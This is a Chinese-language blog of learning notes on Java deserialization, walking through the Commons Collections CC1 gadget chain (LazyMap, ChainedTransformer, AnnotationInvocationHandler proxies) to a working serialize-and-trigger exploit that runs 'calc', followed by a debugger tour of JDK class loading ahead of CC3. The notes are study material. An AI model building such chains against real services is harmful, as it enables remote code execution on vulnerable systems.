entry.content:
学习起点依旧根据前人的经验，从transformer接口来入手，顺便就当复习了transformer是一个接口，或者说是一个抽象类，里面有一个transfer方法，在实现这个类的时候要完成这个方法，我们可以看到有哪些具体的实现类不再赘述
LazyMap 与 transform 调用这次链条的末尾还是invoketransformer，接着往下找，之前我们是走进了transformap，这次我们走进另一个调用它的地方，也就是lazymap
/*   *  Licensed to the Apache Software Foundation (ASF) under one or more *  contributor license agreements.  See the NOTICE file distributed with *  this work for additional information regarding copyright ownership. *  The ASF licenses this file to You under the Apache License, Version 2.0 *  (the &quot;License&quot;); you may not use this file except in compliance with *  the License.  You may obtain a copy of the License at * *      http://www.apache.org/licenses/LICENSE-2.0 * *  Unless required by applicable law or agreed to in writing, software *  distributed under the License is distributed on an &quot;AS IS&quot; BASIS, *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. *  See the License for the specific language governing permissions and *  limitations under the License. */package org.apache.commons.collections.map;    import java.io.IOException;  import java.io.ObjectInputStream;  import java.io.ObjectOutputStream;  import java.io.Serializable;  import java.util.Map;    import org.apache.commons.collections.Factory;  import org.apache.commons.collections.Transformer;  import org.apache.commons.collections.functors.FactoryTransformer;    /**   * Decorates another &lt;code&gt;Map&lt;/code&gt; to create objects in the map on demand.   * &lt;p&gt;   * When the &#123;@link #get(Object)&#125; method is called with a key that does not   * exist in the map, the factory is used to create the object. The created * object will be added to the map using the requested key. * &lt;p&gt;   * For instance:   * &lt;pre&gt;   * Factory factory = new Factory() &#123;   *     public Object create() &#123; *         return new Date(); *     &#125; * &#125; * Map lazy = Lazy.map(new HashMap(), factory); * Object obj = lazy.get(&quot;NOW&quot;); * &lt;/pre&gt;   *   * After the above code is executed, &lt;code&gt;obj&lt;/code&gt; will contain   * a new &lt;code&gt;Date&lt;/code&gt; instance. Furthermore, that &lt;code&gt;Date&lt;/code&gt;   * instance is mapped to the &quot;NOW&quot; key in the map.   * &lt;p&gt;   * &lt;strong&gt;Note that LazyMap is not synchronized and is not thread-safe.&lt;/strong&gt;   * If you wish to use this map from multiple threads concurrently, you must use   * appropriate synchronization. The simplest approach is to wrap this map * using &#123;@link java.util.Collections#synchronizedMap(Map)&#125;. This class may throw    * exceptions when accessed by concurrent threads without synchronization.   * &lt;p&gt;   * This class is Serializable from Commons Collections 3.1.   * * @since Commons Collections 3.0   * @version $Revision: 646777 $ $Date: 2008-04-10 13:33:15 +0100 (Thu, 10 Apr 2008) $   ** @author Stephen Colebourne   * @author Paul Jack   */public class LazyMap          extends AbstractMapDecorator          implements Map, Serializable &#123;        /** Serialization version */      private static final long serialVersionUID = 7990956402564206740L;        /** The factory to use to construct elements */      protected final Transformer factory;        /**       * Factory method to create a lazily instantiated map.     ** @param map  the map to decorate, must not be null       * @param factory  the factory to use, must not be null       * @throws IllegalArgumentException if map or factory is null       */    public static Map decorate(Map map, Factory factory) &#123;          return new LazyMap(map, factory);      &#125;        /**       * Factory method to create a lazily instantiated map.     ** @param map  the map to decorate, must not be null       * @param factory  the factory to use, must not be null       * @throws IllegalArgumentException if map or factory is null       */    public static Map decorate(Map map, Transformer factory) &#123;          return new LazyMap(map, factory);      &#125;        //-----------------------------------------------------------------------      /**       * Constructor that wraps (not copies).     ** @param map  the map to decorate, must not be null       * @param factory  the factory to use, must not be null       * @throws IllegalArgumentException if map or factory is null       */    protected LazyMap(Map map, Factory factory) &#123;          super(map);          if (factory == null) &#123;              throw new IllegalArgumentException(&quot;Factory must not be null&quot;);          &#125;          this.factory = FactoryTransformer.getInstance(factory);      &#125;        /**       * Constructor that wraps (not copies).     ** @param map  the map to decorate, must not be null       * @param factory  the factory to use, must not be null       * @throws IllegalArgumentException if map or factory is null       */    protected LazyMap(Map map, Transformer factory) &#123;          super(map);          if (factory == null) &#123;              throw new IllegalArgumentException(&quot;Factory must not be null&quot;);          &#125;          this.factory = factory;      &#125;        //-----------------------------------------------------------------------      /**       * Write the map out using a custom routine.     ** @param out  the output stream       * @throws IOException       * @since Commons Collections 3.1       */    private void writeObject(ObjectOutputStream out) throws IOException &#123;          out.defaultWriteObject();          out.writeObject(map);      &#125;        /**       * Read the map in using a custom routine.     ** @param in  the input stream       * @throws IOException       * @throws ClassNotFoundException       * @since Commons Collections 3.1       */    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123;          in.defaultReadObject();          map = (Map) in.readObject();      &#125;        //-----------------------------------------------------------------------      public Object get(Object key) &#123;          // create value for key if key is not currently in the map          if (map.containsKey(key) == false) &#123;              Object value = factory.transform(key);              map.put(key, value);              return value;          &#125;          return map.get(key);      &#125;        // no need to wrap keySet, entrySet or values as they are views of      // existing map entries - you can&#x27;t do a map-style get on them.&#125;
这个代码不长我们可以简单的看一下，它继承自AbstractMapDecorator，可以被序列化这里接收两个参数一个是map另一个是transformer，构造方法受保护，用decorate来创建对象，这里有一个get方法，我们的transformer在这里被使用，这个方法是输入一个值检查key是否有对应的value，如果没有调用已经实现的transformer生成一个value然后进行保存返回。我们只要输入的是invoke就可以了，我们先编写测试一下。
public class cc1 &#123;      public static void main(String[] args) throws Exception &#123;          HashMap&lt;Object, Object&gt; oObjectHashMap = new HashMap&lt;&gt;();          ConstantTransformer nihao = new ConstantTransformer(&quot;nihao&quot;);          Map decorate = LazyMap.decorate(oObjectHashMap, nihao);          Object hello = decorate.get(&quot;hello&quot;);          System.out.println(hello);          &#125;;  &#125;
首先我们先测试一下这个lazymap的put方法，验证了我们的判断，接下来让它调用计算器
public class cc1 &#123;      public static void main(String[] args) throws Exception &#123;          HashMap&lt;Object, Object&gt; oObjectHashMap = new HashMap&lt;&gt;();          Runtime runtime = Runtime.getRuntime();          InvokerTransformer exec = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);          Map decorate = LazyMap.decorate(oObjectHashMap, exec);          decorate.get(runtime);            &#125;;  &#125;
不出意外可以正常调用计算器，那么这一步就完成了接着往上走看是谁调用了get方法
追踪 AnnotationInvocationHandler这里有非常多的内容调用了它，暂时我还没有看到怎么具体去寻找，我们作为上帝知道了是AnnotationInvocationHandler调用了
public Object invoke(Object proxy, Method method, Object[] args) &#123;      String member = method.getName();      Class&lt;?&gt;[] paramTypes = method.getParameterTypes();        // Handle Object and Annotation methods      if (member.equals(&quot;equals&quot;) &amp;&amp; paramTypes.length == 1 &amp;&amp;          paramTypes[0] == Object.class)          return equalsImpl(args[0]);      if (paramTypes.length != 0)          throw new AssertionError(&quot;Too many parameters for an annotation method&quot;);        switch(member) &#123;      case &quot;toString&quot;:          return toStringImpl();      case &quot;hashCode&quot;:          return hashCodeImpl();      case &quot;annotationType&quot;:          return type;      &#125;        // Handle annotation member accessors      Object result = memberValues.get(member);        if (result == null)          throw new IncompleteAnnotationException(type, member);        if (result instanceof ExceptionProxy)          throw ((ExceptionProxy) result).generateException();        if (result.getClass().isArray() &amp;&amp; Array.getLength(result) != 0)          result = cloneArray(result);        return result;  &#125;
在这个invoke方法中我们之前也了解这个类了，我们知道他自己写了readobject了，我们去看一看这里的membervalues是我们可以控制的，那么我们就要控制他为lazymap去调用get方法这个类是InvocationHandler的实现类，是一个动态代理，在invoke方法中会自动执行get方法，这就是我们利用的关键。
动态代理实验与排错接下来我们来实现
import org.apache.commons.collections.functors.ConstantTransformer;  import org.apache.commons.collections.functors.InvokerTransformer;  import org.apache.commons.collections.map.LazyMap;  import org.example.LazyMapStudy;  import java.lang.reflect.InvocationHandler;    import java.lang.reflect.Constructor;  import java.lang.reflect.Proxy;  import java.util.HashMap;  import java.util.Map;    public class cc1 &#123;      public static void main(String[] args) throws Exception &#123;          HashMap&lt;Object, Object&gt; oObjectHashMap = new HashMap&lt;&gt;();          Runtime runtime = Runtime.getRuntime();          InvokerTransformer exec = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);          Map decorate = LazyMap.decorate(oObjectHashMap, exec);  //        decorate.get(runtime);          //因为AnnotationInvocationHandler是不能被直接创建的，因此我们使用反射的方法进行创建          Class&lt;?&gt; aClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);          Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);          declaredConstructor.setAccessible(true);          InvocationHandler handler = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorate);            Map proxyInstance = (Map) Proxy.newProxyInstance(                  Map.class.getClassLoader(),                  new Class[]&#123;Map.class&#125;,                  handler          );          proxyInstance.entrySet();            &#125;;  &#125;
我们进行编写验证发现报错，我们重新捋一下这个步骤。我们创建了代理对象和处理器，代理对象把这个方法交给处理器，处理器使用自己的invoke方法，其中有这么一段代码Object result &#x3D; memberValues.get(member);我们传入的是lazymap类型的，因此调用lazymap的get方法，这里的member就是entryset，然后到get中过去执行，显然不能继续我们的利用链，我们要让get中的是runtime对象，因此我们要写一个chaintransformeer来让我们的链条可以继续下去
import org.apache.commons.collections.Transformer;  import org.apache.commons.collections.functors.ChainedTransformer;  import org.apache.commons.collections.functors.ConstantTransformer;  import org.apache.commons.collections.functors.InvokerTransformer;  import org.apache.commons.collections.map.LazyMap;  import org.example.LazyMapStudy;  import java.lang.reflect.InvocationHandler;    import java.lang.reflect.Constructor;  import java.lang.reflect.Proxy;  import java.util.HashMap;  import java.util.Map;    public class cc1 &#123;      public static void main(String[] args) throws Exception &#123;          HashMap&lt;Object, Object&gt; oObjectHashMap = new HashMap&lt;&gt;();          Transformer[] transformers = new Transformer[]&#123;                  new ConstantTransformer(Runtime.class),                  new InvokerTransformer(&quot;getMethod&quot;,                          new Class[]&#123;String.class, Class[].class&#125;,                          new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),                  new InvokerTransformer(&quot;invoke&quot;,                          new Class[]&#123;Object.class, Object[].class&#125;,                          new Object[]&#123;null, new Object[0]&#125;),                  new InvokerTransformer(&quot;exec&quot;,                          new Class[]&#123;String.class&#125;,                          new Object[]&#123;&quot;calc&quot;&#125;)          &#125;;          Transformer chain = new ChainedTransformer(transformers);          Map decorate = LazyMap.decorate(oObjectHashMap, chain);  //        decorate.get(runtime);          //因为AnnotationInvocationHandler是不能被直接创建的，因此我们使用反射的方法进行创建          Class&lt;?&gt; aClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);          Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);          declaredConstructor.setAccessible(true);          InvocationHandler handler = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorate);            Map proxyInstance = (Map) Proxy.newProxyInstance(                  Map.class.getClassLoader(),                  new Class[]&#123;Map.class&#125;,                  handler          );          proxyInstance.entrySet();            &#125;;  &#125;
我们离成功已经很近了
构造两层 Handler我们只需要解决一个问题，我们不执行entryset，让readobject里面去执行，如果我们直接进行序列化反序列化，我们发现首先回复handler，然后这里的membervalues是decorate，这也就意味着实际执行的是decorate.entryset，这很明显不会执行invoke方法，所以我们要想办法让他执行，我们让decorate变成代理就可以了，所以我们再增加一步
import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;public class cc1 &#123;    public static void main(String[] args) throws Exception &#123;        HashMap&lt;Object, Object&gt; oObjectHashMap = new HashMap&lt;&gt;();        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,                        new Class[]&#123;String.class, Class[].class&#125;,                        new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),                new InvokerTransformer(&quot;invoke&quot;,                        new Class[]&#123;Object.class, Object[].class&#125;,                        new Object[]&#123;null, new Object[0]&#125;),                new InvokerTransformer(&quot;exec&quot;,                        new Class[]&#123;String.class&#125;,                        new Object[]&#123;&quot;calc&quot;&#125;),                new ConstantTransformer(null)   // 末尾加 null，避免返回值强转 Set 报错        &#125;;        Transformer chain = new ChainedTransformer(transformers);        Map decorate = LazyMap.decorate(oObjectHashMap, chain);        Class&lt;?&gt; aClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);        declaredConstructor.setAccessible(true);        // 内层 handler：memberValues = LazyMap        InvocationHandler handler = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorate);        // 代理对象：handler 作为 InvocationHandler        Map proxyInstance = (Map) Proxy.newProxyInstance(                Map.class.getClassLoader(),                new Class[]&#123;Map.class&#125;,                handler        );        // 外层 handler：memberValues = proxyInstance，作为反序列化入口        InvocationHandler hander1 = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyInstance);        // ===== 序列化 =====        ByteArrayOutputStream barr = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(barr);        oos.writeObject(hander1);        oos.close();        System.out.println(&quot;序列化完成，字节数: &quot; + barr.size());        // ===== 反序列化（触发） =====        System.out.println(&quot;开始反序列化...&quot;);        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));        ois.readObject();        ois.close();    &#125;&#125;
成功弹出计算器，今天的任务完成
学习回顾我们再来梳理一下今天的学习内容
我们还是从invoketransformer入手，我们这次找到了lazymap，他其中的get方法可以调用transformer执行命令，接下来我们又发现handler的一个实现类，我们发现的invoke方法中是可以调用get的，同时他还有readobject，他会对传入的map进行entryset，我们要对传入的map是一个代理才可以进入invoke，还要保证invoke里面的是lazymap才可以让这个过程顺利执行，所以我们写了两层handler。这也是cc1中很精妙的一部分。

本系列笔记： Java安全学习 · Java 反序列化漏洞：CommonsCollections1（CC1）学习笔记 · cc1链学习 · 正版cc1链学习 · cc3链学习 · cc6链学习 · cc4链的学习

CC3 学习前的准备cc3链和之前就完全不同了，在正式开始学习cc3之前你首先要搞明白类加载的过程，我看了一个视频简直像听天书一样，还是要自己跟进去看一下，接下来我们深入代码研究一下底层类加载的过程
//        获取当前使用的类加载器          ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();  //        加载类并获取返回的Class对象          Class&lt;?&gt; aClass = systemClassLoader.loadClass(&quot;TestClass&quot;);  //        实例化          aClass.newInstance();

断点追踪类加载过程我们在加载类这一行设置断点强制步入进入jdk的内部观察原理首先来到了Classloader类的loadclass方法我们事先已经知道我们获取当前使用的类加载器应该是launcher里面的appclassloader，但是我们为什么首先进入了classloader呢，因为app里面loadclass要求传入两个参数我们只传入了一个所以首先进入他的父类返回两个参数之后在传给他
public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException &#123;      return loadClass(name, false);  &#125;
接着步入进入了launcher里面的loadclass
public Class&lt;?&gt; loadClass(String name, boolean resolve)      throws ClassNotFoundException  &#123;      int i = name.lastIndexOf(&#x27;.&#x27;);      if (i != -1) &#123;          SecurityManager sm = System.getSecurityManager();          if (sm != null) &#123;              sm.checkPackageAccess(name.substring(0, i));          &#125;      &#125;        if (ucp.knownToNotExist(name)) &#123;          // The class of the given name is not found in the parent          // class loader as well as its local URLClassPath.        // Check if this class has already been defined dynamically;        // if so, return the loaded class; otherwise, skip the parent        // delegation and findClass.        Class&lt;?&gt; c = findLoadedClass(name);          if (c != null) &#123;              if (resolve) &#123;                  resolveClass(c);              &#125;              return c;          &#125;          throw new ClassNotFoundException(name);      &#125;        return (super.loadClass(name, resolve));  &#125;
knownToNotExist这个方法会对获取到的类名进行一个缓存检查看是否有缓存且可以被使用，具体代码在URLclasspath里面
synchronized boolean knownToNotExist(String name) &#123;    return this.lookupCacheURLs != null &amp;&amp; lookupCacheEnabled        ? knownToNotExist0(this.lookupCacheLoader, name)        : false;&#125;
如果这个类没有缓存或者缓存不可用则返回flase接着进行查询操作
接着运行到return (super.loadClass(name, resolve)); ，我们发现他会把内容重新交给他的父类，这也是我们看到他在转圈的原因
在进行一些安全检查之后我们发现他有调用了父类的loadclass又回到了classloader里面，怎么在转圈啊
protected Class&lt;?&gt; loadClass(String name, boolean resolve)      throws ClassNotFoundException  &#123;      synchronized (getClassLoadingLock(name)) &#123;          // First, check if the class has already been loaded          Class&lt;?&gt; c = findLoadedClass(name);          if (c == null) &#123;              long t0 = System.nanoTime();              try &#123;                  if (parent != null) &#123;                      c = parent.loadClass(name, false);                  &#125; else &#123;                      c = findBootstrapClassOrNull(name);                  &#125;              &#125; catch (ClassNotFoundException e) &#123;                  // ClassNotFoundException thrown if class not found                  // from the non-null parent class loader            &#125;                if (c == null) &#123;                  // If still not found, then invoke findClass in order                  // to find the class.                long t1 = System.nanoTime();                  c = findClass(name);                    // this is the defining class loader; record the stats                  sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);                  sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);                  sun.misc.PerfCounter.getFindClasses().increment();              &#125;          &#125;          if (resolve) &#123;              resolveClass(c);          &#125;          return c;      &#125;  &#125;
protected Object getClassLoadingLock(String className) &#123;      Object lock = this;      if (parallelLockMap != null) &#123;          Object newLock = new Object();          lock = parallelLockMap.putIfAbsent(className, newLock);          if (lock == null) &#123;              lock = newLock;          &#125;      &#125;      return lock;  &#125;
首先进入这个方法中，我们看注释可以知道这个方法是检查这个类是否被加载过这段代码是获取加载某个类的时候使用的锁对象，暂时先不了解这个跳过接着进行代码然后进入findloadclass
protected final Class&lt;?&gt; findLoadedClass(String name) &#123;      if (!checkName(name))          return null;      return findLoadedClass0(name);  &#125;
很明显从字面上看进行名称的检查，进入checkname的方法
private boolean checkName(String name) &#123;      if ((name == null) || (name.length() == 0))          return true;      if ((name.indexOf(&#x27;/&#x27;) != -1)          || (!VM.allowArraySyntax() &amp;&amp; (name.charAt(0) == &#x27;[&#x27;)))          return false;      return true;  &#125;
就当学习java了，name为空可以返回true，带&#x2F;不支持数组语法的时候不允许[]，然后检查完成这个类没有被加载过所以返回null，继续委派查询
protected Class&lt;?&gt; loadClass(String name, boolean resolve)      throws ClassNotFoundException  &#123;      synchronized (getClassLoadingLock(name)) &#123;          // First, check if the class has already been loaded          Class&lt;?&gt; c = findLoadedClass(name);          if (c == null) &#123;              long t0 = System.nanoTime();              try &#123;                  if (parent != null) &#123;                      c = parent.loadClass(name, false);                  &#125; else &#123;                      c = findBootstrapClassOrNull(name);                  &#125;              &#125; catch (ClassNotFoundException e) &#123;                  // ClassNotFoundException thrown if class not found                  // from the non-null parent class loader            &#125;                if (c == null) &#123;                  // If still not found, then invoke findClass in order                  // to find the class.                long t1 = System.nanoTime();                  c = findClass(name);                    // this is the defining class loader; record the stats                  sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);                  sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);                  sun.misc.PerfCounter.getFindClasses().increment();              &#125;          &#125;          if (resolve) &#123;              resolveClass(c);          &#125;          return c;      &#125;  &#125;

委派与 findClass这里是关键代码再贴出来一遍方便查看我们现在就开始进入双亲委派的流程了，不过不应该叫双亲委派应该叫单亲委派，自己没加载就请求要父加载器加载按照双亲委派的流程我们这个例子应该是由应用加载器交给扩展类加载器，扩展类加载器交给启动类加载器接着我们看代码，c为null，然后由parent执行loadclass，我们发下他执行是按照一样的代码又走了一遍，虽然代码一样但实际执行查找的位置是不一样的然后进入启动类加载器，当然啦最终还是没有找到代码接着往下走
if (c == null) &#123;                  // If still not found, then invoke findClass in order                  // to find the class.                long t1 = System.nanoTime();                  c = findClass(name);                  
从这个代码里我们进入了urlclassloader为什么会进入这个类呢？我们知道appclassloader和extclassloader都是launcher这个类里面的内部静态类，我们可以很明显的看到这个静态类是直接继承自urlclassloader的
static class AppClassLoader extends URLClassLoader &#123;
因为这里面没有重写findclass这个方法，所以去到了他的父类
protected Class&lt;?&gt; findClass(final String name)      throws ClassNotFoundException  &#123;      final Class&lt;?&gt; result;      try &#123;          result = AccessController.doPrivileged(              new PrivilegedExceptionAction&lt;Class&lt;?&gt;&gt;() &#123;                  public Class&lt;?&gt; run() throws ClassNotFoundException &#123;                      String path = name.replace(&#x27;.&#x27;, &#x27;/&#x27;).concat(&quot;.class&quot;);                      Resource res = ucp.getResource(path, false);                      if (res != null) &#123;                          try &#123;                              return defineClass(name, res);                          &#125; catch (IOException e) &#123;                              throw new ClassNotFoundException(name, e);                          &#125;                      &#125; else &#123;                          return null;                      &#125;                  &#125;              &#125;, acc);      &#125; catch (java.security.PrivilegedActionException pae) &#123;          throw (ClassNotFoundException) pae.getException();      &#125;      if (result == null) &#123;          throw new ClassNotFoundException(name);      &#125;      return result;  &#125;
这段代码的寻找方式是把点换成&#x2F;再后面加上class，去寻找这个文件，存在就读取字节码进行定义，找不到就抛出错误
public Resource getResource(String name, boolean check) &#123;    Loader loader;    int[] cache = getLookupCache(name);    for (int i = 0;         (loader = getNextLoader(cache, i)) != null;         i++) &#123;        Resource res = loader.getResource(name, check);        if (res != null) &#123;            return res;        &#125;    &#125;    return null;&#125;
找到则返回找不到返回null但是我们发现返回的结果是null，为什么找不到呢，因为我们现在的加载器是扩展类加载器应该是到应用类加载器的时候才可以找到然后到应用类加载器的时候进入defineclass里面
private Class&lt;?&gt; defineClass(String name, Resource res) throws IOException &#123;      long t0 = System.nanoTime();      int i = name.lastIndexOf(&#x27;.&#x27;);      URL url = res.getCodeSourceURL();      if (i != -1) &#123;          String pkgname = name.substring(0, i);          // Check if package already loaded.          Manifest man = res.getManifest();          definePackageInternal(pkgname, man, url);      &#125;      // Now read the class bytes and define the class      java.nio.ByteBuffer bb = res.getByteBuffer();      if (bb != null) &#123;          // Use (direct) ByteBuffer:          CodeSigner[] signers = res.getCodeSigners();          CodeSource cs = new CodeSource(url, signers);          sun.misc.PerfCounter.getReadClassBytesTime().addElapsedTimeFrom(t0);          return defineClass(name, bb, cs);      &#125; else &#123;          byte[] b = res.getBytes();          // must read certificates AFTER reading bytes.          CodeSigner[] signers = res.getCodeSigners();          CodeSource cs = new CodeSource(url, signers);          sun.misc.PerfCounter.getReadClassBytesTime().addElapsedTimeFrom(t0);          return defineClass(name, b, 0, b.length, cs);      &#125;  &#125;
我们可以看到最后是返回一个defineclass然后我们发现进入了secureclassloader
    return defineClass(name, b, off, len, getProtectionDomain(cs));  &#125;
依旧是返回defineclass，参数不同又进入了他的父类classloader
protected final Class&lt;?&gt; defineClass(String name, byte[] b, int off, int len,                                       ProtectionDomain protectionDomain)      throws ClassFormatError  &#123;      protectionDomain = preDefineClass(name, protectionDomain);      String source = defineClassSourceLocation(protectionDomain);      Class&lt;?&gt; c = defineClass1(name, b, off, len, protectionDomain, source);      postDefineClass(c, protectionDomain);      return c;  &#125;
private native Class&lt;?&gt; defineClass0(String name, byte[] b, int off, int len,                                       ProtectionDomain pd);    private native Class&lt;?&gt; defineClass1(String name, byte[] b, int off, int len,                                       ProtectionDomain pd, String source);    private native Class&lt;?&gt; defineClass2(String name, java.nio.ByteBuffer b,                                       int off, int len, ProtectionDomain pd,                                       String source);
